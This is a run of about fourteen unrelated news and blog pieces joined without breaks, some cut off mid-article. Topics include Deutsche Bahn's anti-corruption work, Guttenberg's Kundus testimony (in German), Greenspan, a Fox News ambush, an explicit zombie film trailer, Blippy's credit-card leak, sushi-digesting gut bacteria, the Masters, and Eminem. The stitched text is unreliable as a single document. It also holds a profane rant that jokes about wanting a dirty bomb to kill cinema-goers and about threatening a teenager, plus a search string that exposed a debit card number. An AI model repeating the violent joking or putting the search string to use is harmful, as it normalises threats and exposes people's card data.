" Over the past 12 months , Deutsche Bahn has done very much in the area of compliance , " he told Deutsche Welle .
" But it still needs to implement some steps . "
Siemens scandal fallout
Numerous German companies with large international operations have given compliance and anti-corruption initiatives greater focus following the Siemens scandal over bribes for international engineering contracts , according to von Blomberg .
" This scandal created a lot of attention – negative attention – and resulted in numerous German companies taking a tougher stance on fighting corruption , " he said .
Siemens scandal has prompted tough anti-corruption action
Deutsche Bahn has ambitious international expansion plans .
On Thursday , the railway company agreed to buy British train and bus operator Arriva in a strategic push to expand in Europe 's increasingly open rail markets .
And the company appears to be aware that as it grows abroad , so , too , do the opportunities for corruption .
Earlier last week , Deutsche Bahn joined Siemens , Daimler and several other foreign companies involved in bribery probes in their home countries to sign an anti-corruption pact aimed at curtailing illegal business practices in Russia .
Both Siemens and Daimler have also been involved in large - scale bribery cases in Russia , where organized corruption is a huge issue .
Under the pact , the companies agreed to prohibit bribery in their operations - both directly and indirectly through intermediaries - and to encourage their suppliers and local counterparts to do so as well .
They also commit to refrain from covert forms of bribery such as donations and support of political parties .
Companies can whistle - blow
" This is a voluntary code of conduct – but one with teeth , " said Brook Horowitz , executive director of the International Business Leaders Forum , which also signed on to the project along with the American Chamber of Commerce and the Association of European Businesses .
He said the pact includes a number of " tough measures " such as the possibility for companies to whistle - blow .
In Transparency International 's annual Corruption Perception Index of 180 countries , Germany ranked 14 .
New Zealand was awarded the top ranking with the least corruption , while Somalia performed worst .
Despite the bribery scandals with a few high - profile companies such as Daimler and Siemens , " Germany has managed to be a global exporter without being a leader in corruption , " von Blomberg said .

Guttenberg laviert sich durch den Kundus- Untersuchungsausschuss Silvio Duwe
Verteidigungsminister Karl - Theodor zu Guttenberg agiert vor dem Kundus - Untersuchungsausschuss äußerst ungeschickt
Eigentlich sollte die gestrige Sitzung des Kundus - Untersuchungsausschusses im Fernsehen übertragen werden .
Nicht nur die Oppositionsfraktionen , sondern auch zu Guttenberg , der als Zeuge vor den Ausschuss geladen war , hatte der Übertragung bereits zugestimmt .
Doch die Regierungskoalition lehnte ab – man wolle ein " Spektakel Guttenberg " vermeiden , begründete Ernst - Reinhard Beck die Entscheidung für die CDU .
Wer die Sitzung des Untersuchungsausschusses vor Ort verfolgt hat , weiß : Das war auch besser so – zumindest für zu Guttenberg .
Der sonst so redegewandte Minister wollte sich möglichst wenig von seiner vorgefertigten Rede entfernen .
Nachfragen waren so kaum möglich , die Anhörung von zu Guttenberg wirkte wenig offen .
Eine Liveübertragung der Befragung hätte dem öffentlichen Ansehen des Verteidigungsministers , der sich mühevoll durch die Fragerunden manövrierte , mit Sicherheit nicht gut getan .
Omid Nouripour ( Grüne ) kritisierte , dass der Minister keine Antwort gebe , " ohne von seinem Zettel hochzuschauen " und nannte den Auftritt unerwartet unsouverän .
Bild : S. Duwe
Über eine Stunde lang spricht der Minister vor dem Ausschuss , der klären soll , wie es zu der Neubewertung des Luftschlags auf zwei Tanklastzüge bei Kundus durch den Minister gekommen ist .
Doch zu Beginn seiner Rede weist zu Guttenberg zunächst darauf hin , dass der Afghanistan - Einsatz vom Bundestag gemeinsam beschlossen worden sei .
Ohne die Entscheidung des Bundestages , soll das bedeuten , hätte Oberst Klein niemals den Befehl zu dem umstrittenen Luftschlag geben können .
Irgendwie sind also alle ein wenig mit Schuld , auch an dem Informationsdesaster nach dem Bombenabwurf von Kundus , so kann man den Minister verstehen .
" Wir spüren die Last der Verantwortung , aber wissen wir , was es heißt , in Extremsituationen handeln zu müssen ? " , so stellt sich zu Guttenberg gleich zu Beginn hinter Oberst Klein und betont , er habe den Untersuchungsausschuss immer unterstützt .
Dankbar sei er , nun seine Sichtweise darstellen zu können , um die teilweise bizarren Anschuldigungen gegen seine Person wieder richtig stellen zu können .
Ihm sei an Aufklärung gelegen .
Bei seiner ersten Pressekonferenz zum Thema am 26 .
Oktober 2009 , auf der er den Angriff als militärisch angemessen bezeichnete , so erklärt der Verteidigungsminister , sei er hauptsächlich von drei Punkten ausgegangen : Damals stand für den Minister erstens fest , dass es Opfer unter Unbeteiligten gegeben habe , zweitens , dass ISAF - interne Bestimmungen verletzt worden seien .
Trotzdem hielt er den Luftschlag für militärisch angemessen , denn er sei drittens überzeugt gewesen , dass es auch ohne die Verfahrensfehler zu dem Luftschlag hätte kommen müssen .
Diese Bewertung wird er später revidieren , angeblich , weil ihm neue Erkenntnisse vorlagen , die ihm bis dahin von Staatssekretär Wichert und Generalinspekteur Schneiderhan vorenthalten worden seien .
Zu Guttenberg bekräftigte , dass er den Generalinspekteur Schneiderhan und Staatssekretär Wichert entlassen hatte , weil diese ihm Unterlagen , insbesondere den Feldjägerbericht , vorenthalten hätten .
Er betonte jedoch , dass der Begriff des Vorenthaltens für ihn nichts mit Vorsatz oder bösartiger Absicht zu tun habe .
Vielmehr habe es unterschiedliche Arbeitsauffassungen gegeben .
Schneiderhan hatte bei seiner Vernehmung im Kundus - Untersuchungsausschuss am 18 .
März diesen Jahres erklärt , er habe zu Guttenberg so informiert , dass dieser voll entscheidungsfähig gewesen sei .
Mit dem ISAF - Bericht , dessen Zusammenfassung und Bewertung zu Guttenberg laut seiner Aussage im Ausschuss am 3 .
November vorgelegt wurde , sei der Minister umfassend unterrichtet gewesen , so Schneiderhan damals .
Bild : S. Duwe
In der Sache widersprach zu Guttenberg dem nicht .
Trotz mehrfachen Nachfragen konnte zu Guttenberg keinen einzigen Fakt aus den ihm vorenthaltenen Dokumenten nennen , der ihn zu der bekannten Kehrtwende in seinen Einschätzungen zur Angemessenheit des Luftangriffs gebracht hatte .
Trotzdem seien die verschiedenen Berichte nicht kongruent .
Was das inhaltlich zu bedeuten hat , bleibt jedoch unklar .
Seine Kehrtwende von der Einschätzung , das Bombardement sei militärisch angemessen , hin zu der Einschätzung , dieses sei falsch gewesen , ist laut zu Guttenberg das Ergebnis unterschiedlicher Aspekte , ohne diese jedoch zu benennen .
Die Entlassung von Wichert und Schneiderhan hatte laut zu Guttenberg demnach auch nichts damit zu tun , dass ihm wichtige Informationen fehlten , sondern damit , dass diese ihn über die Existenz der Berichte erst nach wiederholtem Nachfragen berichtet hätten .
Sein Anspruch sei immer gewesen , seine Entscheidungen auf der Grundlage möglichst vollständiger Informationen zu fällen .
Den Widerspruch zu der Tatsache , dass die Guttenberg zunächst nicht bekannten Berichte keinerlei neue Informationen enthielten , was der Minister selbst bestätigte , konnte er jedoch nicht auflösen .
Vielmehr konterte er mit der rhetorischen Frage , ob von guter Politik nicht erwartet werden würde , dass sie sich korrigiert .
Die anschließenden Nachfragen der Opposition , welche Aspekte ihn zu der Neubewertung geführt hätten , beantwortete der sonst so wortgewandte Freiherr regelmäßig mit dem erneuten Verlesen von Passagen seines Redemanuskripts .
Auf weiteres Nachhaken reagierte er mit dem Verweis auf seine bereits gegebenen Ausführungen .
Dies veranlasste Volker Kauder ( CDU ) , die Opposition zu ermahnen , nicht ständig Fragen an den Minister zu wiederholen .
Das Vertrauensverhältnis zwischen zu Guttenberg und seinem Staatssekretär sowie dem Generalinspekteur sei erst am 25 .
November nachhaltig erschüttert worden , so der Minister .
Tags zuvor hatte er erfahren , dass der Bild - Zeitung ein deutscher Untersuchungsbericht vorliege , den er bis dahin noch nicht kannte .
Auch dem Leiter des Planungsstabes sei nicht bekannt gewesen , dass der Bericht existierte .
Bis zu diesem Zeitpunkt habe er geglaubt , umfassend informiert gewesen zu sein .
Doch am Nachmittag des 25 .
November wollte er Klarheit schaffen , bestellte Wichert und Schneiderhan zu sich ins Büro .
Durch die Aussage des Leiters des Planungsstabes im Verteidigungsministerium , Dr. Schlie , Schneiderhan und Wichert hätten eine nationale Untersuchung des Vorganges abgelehnt , sei er bereits beunruhigt gewesen .
Er erkundigte sich bei beiden , ob es deutsche Berichte gebe , die er noch nicht kenne – beide hätten mehrfach verneint .
Erst nach dem Hinweis auf die Bildzeitung habe Schneiderhan die Existenz des Feldjägerberichtes erwähnt .
Wichert habe behauptet , den Feldjägerbericht gar nicht zu kennen .
Die Anmerkung des Generalinspekteurs , der Feldjägerbericht sei unter Umständen nachteilig für die Bundeswehr , machte zu Guttenberg vollends misstrauisch .
Irgendwann zwischen 14 Uhr und 17 Uhr am selben Tag fiel dann die Entscheidung , Schneiderhan und Wichert zu entlassen .
Dass es keine wirklich neuen Informationen in den Dokumenten gab , konnte er zu diesem Zeitpunkt jedoch noch nicht wissen , so zu Guttenberg .
Die von Guttenberg geschilderten Abläufe , insbesondere zum Tag der Entlassung von Generalinspekteur Schneiderhan und Staatssekretär Wichert , decken sich nicht mit deren Schilderung des Ablaufes .
Doch das ist nicht der einzige offene Punkt , der noch bleibt .
Weiterhin nebulös ist , welche Fakten zu Guttenberg zur Neubewertung des Luftschlages veranlasst haben .
SPD - Verteidigungsexperte Rainer Arnold sagte dann auch im Anschluss an den Untersuchungsausschuss , Guttenberg sei es nicht gelungen , den Beweis zu führen , dass ihm Wichert oder Schneiderhan irgendeine Information vorenthalten hätten .
Die Entlassung der beiden bezeichnete er als Machtmissbrauch .
Die Korrektur der Bewertung des Luftangriffs habe er allein und ohne die Expertise seines Hauses zu suchen vorgenommen .
Arnold kündigte an , zu Guttenberg nochmals vor den Ausschuss zu laden , um seine Aussagen und jene von Wichert und Schneiderhan gegenüberzustellen .
" Es ist undenkbar , dass sich ein Minister im Amt hält , bei dem die Vermutung und der Verdacht da ist , dass er das Parlament und die Öffentlichkeit belügt " , so Arnold .
Laut Joachim Spatz ( FDP ) und Ernst - Reinhard Beck ( CDU ) hat zu Guttenberg die Fragen hingegen zufriedenstellend beantwortet .
Die Koalitionsparteien hatten schon vor dem Untersuchungsausschuss deutlich gemacht , dass sie die Vernehmung weiterer Zeugen mit der Anhörung von zu Guttenberg beenden wollen .
( Silvio Duwe )
WASHINGTON , April 7 ( Reuters ) - Former Federal Reserve Chairman Alan Greenspan chastised critics on Wednesday by pointing out that Congress pushed the U.S. central bank to make sure lending to poorer Americans kept rising in the 2000s .
“ If the Fed as a regulator had tried to thwart what everyone perceived as a fairly broad consensus that the trend was in the right direction , homeownership was rising and that was an unmitigated good , then Congress would have clamped down on us , ” he told a questioner at a congressionally appointed commission investigating the financial crisis .
“ There ’s a presumption that the Federal Reserve ’s an independent agency , and it is up to a point , but we are a creature of the Congress and if ... we had said we ’re running into a bubble and we need to retrench , the Congress would say ‘ we have n’t a clue what you ’re talking about ’ , ” Greenspan said .

Everyone in the journalism business knows that Bill O'Reilly 's ambush crews are among the more outstanding examples of the gaping lack of anything resembling journalistic ethics at the Fox News Channel .
But no one wants to talk about it .
So like clockwork , we can count on Jesse Waters and his intrepid crew ambushing various people -- some of them public figures , some of them private citizens .
Their most recent victim was Al Gore , who knows a thing or two about journalism .
He recognized what Waters was up to and told him flatly at the outset : " I do n't like ambush journalism . "
Finally , Gore had to get in Waters ' face to explain to him he had no intention of being interviewed under those circumstances .
O'Reilly seems to think that this was some sort of coup .
But notice that Waters does get off two questions .
And they 're very revealing , because both are predicated on falsehoods .
In other words , Waters ' questions are lies .
In order :
A. " What 's your reaction to the fact that the Arctic ice is increasing ? "
Actually , the Arctic ice cap is indeed shrinking dramatically , with 2007 being the worst year on record .
However , things got slightly better in 2008 and 2009 : they were only the second - and third - worst ice - cap melt years on record .
See , for folks on the right , that constitutes an " increase . "
But only for folks on the right .
B. " Are you embarrassed at all by Climategate , sir ? "
Hmmm .
I dunno about Al Gore , but since the scientific work and the scientists involved have been completely exonerated and the entire " Climategate " dustup revealed as a right - wing hoax that served double duty as propaganda and a smear campaign , it sure would be tempting to answer this one :
" Not at all , Jesse .
And are n't you embarrassed at all for having promulgated a hoax and a smear ? "
Of course , that is much wordier than the simple , handy , universal answer to any and every question we recommend for anyone ambushed by Jesse and his pals :
" Andrea Mackris . "
Twitch Film got the drop on a very NOT WORK SAFE trailer for Takao Nakano ’s Big Tits Zombie , a 3 - D adaptation of Rei Mikamoto ’s cult manga Kyonyo Dragon .
The site teases , “ Strippers versus zombies !
Strippers versus sushi !
AV star Sola Aoi ( Sora Aoi ) wielding a chainsaw ! ”
What more could you possibly need ?
Watch the trailer and read the synopsis by heading below .
What do you think ?
“ Rena Jodo ( Sola Aoi ) is a stripper who just got back from Mexico and she has been offered a gig at a hot spring resort .
When she arrives , she finds a deserted country town .
There ’s hardly anyone in the audience at the strip club and all the other strippers , including Ginko ( Risa Kasumi ) , Maria ( Mari Sakurai ) , Nene ( Tamayo ) and Dana ( Io Aikawa ) are all bored stiff .
They do n’t know what to do with their time and they are on the verge of fighting each other .
When they decide to go down to the basement of the club to kill time , Maria finds a “ Book of the Dead ” near “ the Well of the Spirit . ”
But who could have imagined the horror and panic that find would bring ?
Maria ’s reading of the book out loud has somehow revived the dead and zombies start appearing all over the world attacking mankind .
It ’s Hell in the real world !
Dana and Nene are bitten by the zombies and they turn into living dead who attack Rena and Ginko .
The poor big‐bosomed babes have no choice but to fight against Maria who now rules the zombies and tries to establish a kingdom of zombies .
Rena and Ginko have to challenge Maria and the hordes of zombies !
And how does the Blue Demon Devil ( Minoru Torihada ) fit in ? ”
Pity Hollywood .
For they are losing money hand over fist because of dirty internet pirates .
Pity John Travolta and his private jet fleet ; pity George Clooney unable to heat his Italian lakeside mansion ; Pity Tom Cruise for ... well , being Tom Cruise .
But pity these poor studios and stars , living on the breadline and having to sacrifice so much in their struggle to survive .
Or , to look at it a different way : fuck these cosseted prima - donnas and their multi-million dollar lifestyles .
Does anybody lose sleep at night because Nicole Kidman has to rely on cosmetic adverts to earn her umpteenth million dollars that month ?
Do you donate some of your wages because Sony can only find $ 130 Million to make Spider - Man 32 ?
Do you fuck .
But hold on , do n't think I 'm advocating piracy .
It 's illegal and funds child molesters and bombs and stuff .
And why would you want to watch a badly - copied version of the latest blockbuster filmed in a cinema with people wandering about and talking over the soundtrack ?
You would n't .
But ask yourself another question - why would you want to pay upwards of � 25 to go to the cinema for the delight of seeing the latest blockbuster with people wandering about and talking over the soundtrack ?
Because that 's what invariably happens .
When was the last time you went to the cinema and everybody just sat there and enjoyed the movie without getting up for a piss , munching stuff ( why does watching movies equate with a portable fucking picnic feast ?
It 's two hours - you can survive that long without stuffing your face ) or talking incessantly all the way through ?
( * feels anger rising already * )
Hollywood 's big studios point at internet piracy as the downfall of everything .
They are not content with simply saying , " Look , you 're stealing our profits and Gwyneth Paltrow can't afford to live on merely $ 15 million per year " .
Instead , they clumsily try and connect you downloading Rush Hour 4 with funding Muslim paedos and dog fighting arenas and granny punching .
( * sigh * )
Really ?
Is that the best you can do ?
Just admit you 're pissed off that your company only made $ 800,000 million last year and you 're fucking greedy .
Do n't try and tell some bored 12 year - old in his parent 's basement downloading X - Men : Clumsy Allegory that every time he watches a pirate movie that a beautiful butterfly is bummed to death by carjackers .
Follow us on Twitter @ The_Shiznit for more fun features , film reviews and occasional commentary on what the best type of crisps are .
I get that piracy costs studios profits , I 'm not stupid .
But blaming internet pirates is lazy and , more accurately , wrong .
You want a better reason that your profits are down ?
People do n't go to the cinema that often any more .
Because it 's turned into an awful , expensive experience more akin to The Road Warrior than a fun evening out .
Cinema target audiences are , we 're told , 16 - 25 year - olds .
That is the golden market all studios aim for .
Why ?
Because most people over 25 can't be bothered any more ; they have too much to do instead of spending the evening in Hell trying to watch a film they do n't really fancy that much anyway but they need to try and recapture some of the passion from courting days instead of sinking into silent reflection and slowly increasing resentment that somehow , somewhere they fucked their lives up and are now destined to spend the next 40 years in a slowly suffocating life .
[ Whoah - Ed's note ]
Who goes to the cinema these days ?
Why would you bother to ?
Ticket prices range from � 8 - 15 per person , plus snacks .
If you have kids , you 've had to arrange a babysitter which may incur more costs .
You line up to get a ticket , line up to buy processed shit you can get in a supermarket for half the price , line up to go into the auditorium and then find a seat .
If you 're lucky , you wo n't be squashed in the middle .
But you know , just know , you 're going to get stuck behind somebody with massive hair or kicked repeatedly by Crazy Legs Crane behind you .
You can sit through 25 mins of adverts that people inexplicably laugh at - do these morons laugh at home pointing at the television ? - and look around trying to identify the fucking clown with the laser - pointer pen .
And when the film finally starts , somebody will need a pee so you 'll all have to stand up as they shuffle out past you .
YOU KNEW YOU WERE WATCHING A FILM , GO TO THE TOILET FIRST YOU SELFISH FUCKING INFANT - BLADDERED CHIMPANZEE BASTARD .
And talking .
The endless talking .
" Who 's that ? "
" Which one is the robot ? " " So she 's the ghost ? "
" Why is Die Hard fighting a plane ? " as you grind your teeth to powder as your partner grasps your upper arm whispering , " Do n't , just ignore it " .
The last time I went to the cinema , I had to drag the manager in to eject a group of teenagers at the front who were clearly there to keep warm and dry , had no interest in the film and thought it could be improved by commentary and phone calls .
He would n't do anything , which resulted in my dragging one kid from his seat and threatening to beat him in front of his girlfriend , a refund and a dramatic storming from the cinema with an embarrassed friend trailing behind me clearly not listening to my outraged bellows about " never returning to this fleapit fuckpond again " and remaining unresponsive to my questions about obtaining portable dirty bombs .
( Saddam Hussein wanted them to kill thousands of Kurds .
I wanted one to kill 40 - 50 cinema - goers who could n't still their idiocy for longer than 126 minutes . )

Blippy , the social network for people who want to publicize their purchases , got in big trouble yesterday for publishing some of its users credit card numbers .
But by mid-afternoon , Blippy had announced the problem was taken care of and that the situation was " a lot less bad than it looks . "
Well , it still looks really bad .
With the help of an SAI reader , we found Blippy was still making at least one debit card number available to scamsters Google searching for the terms " site:blippy.com +outstanding . "
We 've pasted a screenshot below .
A Blippy spokesperson agreed with us yesterday that these kinds of privacy mistakes are a " nightmare scenario " for Blippy .
Rational people would assume that two days of publishing user 's credit card and debit card numbers would be death blow for a social network designed for people who want to publish the purchasing history .
We 're not so certain .
The very fact that anybody uses Blippy , even before this week 's cluster , suggests to us that there are lots of people with very little concern for their privacy .
Some people would even suggest those types are just being realists , that any sense of privacy on the Internet is an illusion anyway .
Still , we recommend these people Google their Blippy account and make sure nothing they do n't want exposed is exposed .
The reader who spotted this info asked us not to use his name .
We asked him if he was associated with Blippy or any of its competitors .
He told us , " no connections whatsoever beside being a user . "
" I just do n't want problems with authorities because of the credit card numbers or anything .
I do n't think its a felony since it 's google publishing this information but I would n't want to worry like the guy who sold the iphone 4g you know ! "
Here 's the screenshot .
We 've blurred out the debit card number in the bottom result .
Update : Blippy cofounder Philip Kaplan has reached us with a statement :
We sincerely apologize to this user .
We 've reached out to him and will do what it takes to make sure he is minimally affected .
We have also reached out to Google and have asked them to re-index that page and the rest of their cache of the Blippy website .
As with the issue yesterday , the page in question is a 2 - month old page on Blippy that temporarily displayed a users credit card number , which was erroneously sent by his bank as the name of a merchant , in the HTML source .
It should have never happened and we take full responsibility .
I just spoke with a Google representative and informed them of the situation .
Google is cooperative and moves quickly -- I expect the probably will be taken care of soon .

Black smokers , hotbeds for life ( Image : Charles Fisher / NSF Ridge 2000 programme )
IN THE beginning there were Ida and Luca .
The initial Darwinian ancestor – Ida – and the last universal common ancestor – Luca – assembled themselves from the spare parts sloshing around on the early Earth .
Once all the ingredients were in place , it looks like life was all but inevitable .
The finding comes from recent discoveries about the behaviour of chemicals thought to have been present on the primordial Earth , relating to two key stages in the evolution of life .
Ida was the first molecule that was able to self - replicate .

A United Nations report has ranked Calgary the fifth - highest emitter of greenhouse gas emissions on a per capita basis in the world .
Alberta ’s largest city emitted 17.7 tonnes of carbon dioxide per person in 2003 , according to the UN Environment Programme ’s paper on urban environments .
Comparatively , each person in the City of Toronto emitted 9.5 tonnes in 2004 , whereas Vancouver residents were each responsible for 4.9 tonnes in 2006 ( placing both cities roughly in the middle of the 50 urban centres included in the survey ) .
The only four cities ranking above Calgary were Minneapolis ( 18.34 tCO2e / capita in 2005 ) , Washington , D.C. ( 19.70 tCO2e / capita in 2005 ) , Denver ( 21.5 tCO2e / capita in 2005 ) , and Rotterdam , Netherlands ( 29.80 tCO2e / capita in 2005 ) .
Calgary is often association with poor environmental practices on account of the city 's proximity and corporate ties to the tar sands operations , which have come to be routinely vilified in the international press .
Rotterdam ’s exceptionally high rate of emissions can largely be attributed to its massive sea port , which attracts ocean - going , carbon - spewing vessels that service much of Europe .
The three cities included in the report with the lowest emissions were Sydney , Australia ( 0.88 tCO2e / capita in 2006 ) , Dhaka , Bangladesh ( 0.63 tCO2e / capita in an unspecified year ) , and Kathmandu , Nepal ( 0.12 tCO2e / capita in an unspecified year ) .

Porphyran , a polysaccharide present in the cell walls of a red algae that is used notably in the preparation of sushi , is broken down specifically by an enzyme called porphyranase .
This new enzymatic activity has been identified in marine bacteria and , surprisingly , in the bacteria that populate the gut of the Japanese .
Scientists from CNRS and UPMC have explained this discovery by a transfer of genes between the bacteria , that allows the gut microbiota of the Japanese to acquire all the " machinery " it needs to consume the algae that surround sushi .
Their results are published in Nature on April 8 , 2010 .
Without intestinal flora , humans cannot break down the polysaccharides in their diet , which are one of the principal sources of energy for the brain .
Indeed , intestinal bacteria contain enzymes that are known to " break down " polysaccharides ( 1 ) , which are polymers made up of carbohydrates .
They are essential because the human genome is not endowed with such enzymes .
Two research teams working at the Station Biologique in Roscoff ( CNRS / UPMC ) have been working on porphyranase , an enzyme that breaks down polysaccharides but whose true activity was previously unsuspected .
These teams have thus discovered that porphyranase breaks down a highly specific molecule : porphyran , and not another substrate , as had previously been thought ( 2 ) .
Porphyran is a polysaccharide , one of the components in the walls of a red- colored marine algae called Porphyra .
These algae are used to prepare Japanese sushi .
According to historical documents , this alga has been consumed for many generations by the Japanese ( 3 ) .
Of considerable cultural importance in Japan , it has sometimes served as a gift or to pay certain taxes .
The researchers then demonstrated the process of recognition between the enzyme ( porphyranase ) and its substrate ( porphyran ) .
They were thus able to identify the " signature " of the sequence involved in this recognition ( the specific site on the enzyme to which the reagent binds ) .
As expected , this novel enzymatic activity was detected in marine bacteria .
Further investigations led the scientists to compare genomic data regarding the gut microbiota of 13 Japanese individuals and 18 North Americans .
They thus discovered that porphyranase was also present in the gut microbiota of the Japanese ( but not in that of the North Americans ) .
The scientists suppose that the presence of this enzyme in the gut microbiota of the Japanese is directly linked to their dietary habits .
As major consumers of Porphyra for several centuries , the Japanese have thus been in contact with the marine bacteria that contain porphyranases via their diet .
Mirjam Czjzek and her team presume that a transfer of genes from marine bacteria to intestinal bacteria must have allowed the microbiota of the Japanese to accept the " machinery " required to break down the polysaccharides in Porphyra algae .
These findings suggest that food associated with marine bacteria may constitute a means for the human gut microbiota to acquire new enzymes , which may , among other factors , explain their diversity .
Notes
(1) For example , cellulose and starch .
(2) It was previously thought that agarose , a carbohydrate polymer that is also extracted from red algae , was the substrate for this enzyme .
(3) Writings testify that the algae served as a form of payment in the 8th century .
FINAL ROUND LEADERBOARD ( US unless stated ) :

Clubhouse scores By Rob Hodgetts
BBC Sport at Augusta
Phil Mickelson overhauled Lee Westwood to claim a third Masters Green Jacket after an enthralling final round at Augusta .
The 39 - year - old Mickelson produced some customary magic to pass third - round leader Westwood and dash the Englishman 's hopes of winning a long - awaited first major title .
Mickelson fired a final - round 67 to end on 16 under , three shots clear of Westwood , to clinch a fourth major championship .
Westwood carded a one - under 71 but could not quite match the brilliance of the American and has now finished second , third and third in his last three majors .
Anthony Kim finished strongly , shooting a stunning 65 to finish third on his own at 12 under .
Tiger Woods - the four - time Masters champion - was one stroke further back despite five months out following revelations about his private life .
Please turn on JavaScript .
Media requires JavaScript to play .
South Korea 's KJ Choi , who held the joint - lead with Mickelson early on the back nine , also finished on 11 under after a 69 to share fourth with Woods .
The 50 - year - old Fred Couples , who was the champion in 1992 , was a firm favourite with the Augusta crowd and came within two of the lead before finishing sixth on nine under .
Mickelson , the 2004 and 2006 winner , was one shot adrift of Westwood at the beginning of the final round , but had moved to two in front after a birdie on the short 12th .
He then fired a stunning second shot from behind a tree into the 13th green to set up an eagle chance .
And , though he missed , he made a birdie to maintain a two - shot lead over Westwood , who also birdied , before racing three ahead at the 15th .
ROB HODGETTS ' BLOG Mickelson is the total package .
A family man , loved by fans for genuinely engaging with them , a brilliant player , an accomplished winner
The 36 - year - old Westwood , who made three birdies and two bogeys to trail Mickelson by one at the turn , narrowed the gap to two with a birdie on 17 but could only par the 18th as Mickelson picked up another birdie to clinch the title in style .
He joins Jimmy Demaret , Sam Snead , Nick Faldo and Gary Player on three Masters titles with only Tiger Woods and Arnold Palmer ( four ) and Jack Nicklaus ( six ) ahead of them .
Mickelson has suffered an emotional year after the discovery that both his mother and wife Amy had contracted breast cancer , and he hailed the win as " one of the best things we 've gone through " .
" To come out the other end and feel the jubilation is incredible , " said Mickelson , who also won the USPGA title in 2005 .
Afterwards Mickelson admitted he did not know whether his wife was going to make it to the course as she was struggling with low energy because of the medication she is taking to fight the disease .
" To walk off the green and see her was very emotional for us , " he added .
" It 's been a difficult year , and to come out on top in this tournament is very emotional . "
Mickelson admitted the last three holes were anything but comfortable , despite holding a three - shot lead .
He had earlier seen compatriot Kim mount a stunning challenge by picking up five shots on the back nine , including an eagle at the 15th to surge into the top three , while Woods , who began four shots behind , lost three strokes in the first five holes .
Woods holed his second for an eagle on the seventh and climbed back to nine under at the turn before a topsy - turvy back nine , which included two bogeys , two birdies and an eagle , took him to 11 under .
" I entered this event to win and I did n't get that done , " said a disappointed Woods .
" I finished fourth .
It 's not what I wanted .
I wanted to win and as this week went on I played worse .
" After Friday it was n't very good .
I did n't hit it well enough and made too many mistakes around the green .
I 'm going to take a little time off and evaluate where I go from here . "
American Nick Watney also fired 65 to climb to eight under , with compatriot Hunter Mahan and South Korea 's USPGA champion YE Yang seven under .
Ian Poulter was unable to bounce back after losing ground on Saturday and the Englishman finished five under after a closing 73 .
" I 'm frustrated , " he said .
" Yesterday I did n't hit it at all well off the tee and got myself into trouble .
I played pretty well today .
It 's a game of fractions around this golf course .
Tenth - I 'm not overly satisfied . "
Tom Watson , the 60 - year - old two - time Masters champion , followed up his second - placed finish at the Open last year with a tie for 18th at one under alongside defending champion Angel Cabrera of Argentina .

Koichi Takada Architects have completed the Cave Restaurant in Sydney , Australia .
Description from the architects :
We aim to change the way we eat and chat in restaurants .
The acoustic quality of restaurants contributes to the comfort and enjoyment of a dining experience .
We have experimented with noise levels in relation to the comfort of dining and the ambience a cave like environment can create .
The timber profiles generate a sound studio atmosphere , and a pleasant ‘ noise ’ of dining conversation , offering a more intimate experience as well as a visually interesting and complex surrounding .
The series of acoustic curvatures were tested and developed with computer modelling and each ‘ timber grain ’ profile has been translated and cut from computer - generated 3 - D data , using Computer Numerical Control ( CNC ) technology .
As other GOP governors look to the courts to roll back the federal healthcare overhaul , Gov. Arnold Schwarzenegger on Thursday embraced the legislation and announced that he is directing his administration to begin implementing the new system in California .
“ We are ready to roll up our sleeves and work with the federal government to get this done , ” Schwarzenegger said in a speech at UC Davis Medical Center .
“ The bottom line is this :
If national healthcare reform is going to succeed , it has to be a partnership with the states … .
I am directing my administration to move forward . ”
The governor said he would call a special session of the Legislature , if necessary , to quickly put in place the legislative changes needed for the federal healthcare plan .
He also said his administration would work with the federal government to create a “ high risk ” coverage pool to cover Californians who have been refused insurance because of their medical histories .
Schwarzenegger said California also would enforce new federal rules that prevent insurance companies from denying coverage to children and would remove lifetime dollar limits on care .
The almost unequivocal endorsement is a turnabout for the governor :
In January , he made headlines for harshly criticizing the proposal in his State of the State speech .
Singling out a “ sweetheart deal ” secured by Nebraska Sen .
Ben Nelson , a Democrat , Schwarzenegger complained that backroom deal - making in Congress had secured more federal assistance for some states than for others .
“ That senator got for the Cornhusker State the corn , and we got the husk , ” he said in January .
The governor said Thursday that he was unconcerned that his enthusiasm for the new federal program could further strain relations with his own political party .
“ I am not a party servant , ” he said . " I am a public servant . ”
Schwarzenegger ’s announcement drew praise from the Obama administration , which has been struggling to shore up support for the healthcare plan since the president signed it into law a month ago .
The attorneys general of 14 states , mostly Republicans , have filed lawsuits seeking to overturn the federal legislation .
GOP governors have endorsed the court action .
In California , Republican lawmakers are calling on Atty .
Gen. Jerry Brown to join the litigation .
Brown issued a statement in late March saying that “ healthcare is not the place , with people ’s lives at stake , to engage in poisonous partisanship . ”
Detractors of the federal plan say it will place a crushing multibillion - dollar financial burden on states .
The White House argues that such projections do not factor in huge savings that states will realize as tens of millions of Americans who are currently not covered are able to get insurance .
Then , the administration says , states will no longer have to pay for those patients ’ emergency room visits and many other expenses associated with the uninsured .
Schwarzenegger has expressed concern about the other costs — estimating them at $ 2 billion to $ 3 billion per year for California — and has vowed to continue pressing the federal government to provide more implementation funds to the states .
But he said the benefits of the federal plan outweigh such concerns .
“ The plan is not without flaws , ” he said .
“ But it is a good law . ”
U.S. Secretary of Health and Human Services Kathleen Sebelius released a statement Thursday saying that Schwarzenegger “ deserves credit for his proactive work to help improve public health and prevent disease and illness . ”

[ artist id = " 502642 " ] Eminem [ / artist ] has said that when he opened up his planned album Relapse 2 to a variety of producers , he was inspired to not just change the direction of the LP , but rethink the project completely :
He buried the Relapse sequel and started working on Recovery , which will be out on June 22 .
" I kinda went back to the lab on that whole concept , " Em told radio personality Angela Yee on her Shade 45 show " The Morning After , " on Thursday ( April 29 ) .
" As I started getting to work with different producers and sh-- , the very sound changed and I kinda turned the corner . "
Em rattled off an impressive array of trackmasters that he secured for Recovery , including Dr. Dre , DJ Khalil , Boi -1da — who produced the album 's first single , " Not Afraid , " which debuted Thursday — and Havoc from Mobb Deep .
" He sent me a couple of tracks , " Em , a huge Mobb Deep fan , said of Havoc .
" They were both cool , but one of them was that sh-- and I had to do something to it .
I 'm just happy I got to work with him . "
Jim Jonsin ( T.I. , Lil Wayne ) also worked on the LP .
" He was open to ideas , " Jonsin told Mixtape Daily .
" He was real respectful to my craft .
He let me do what I do .
He asked me ideas on some of the lyrics .
We had ideas for lyric changes .
Certain words may or may not work on radio .
We talked about that .
He had a setup outside of the room to do production , but I 'd rather be in the room where he was at , and he was cool with that .
And I knocked out a couple of joints in there while he was in there with me .
He was pretty open and he let me do my thing .
He did his thing .
It was a pretty good experience .
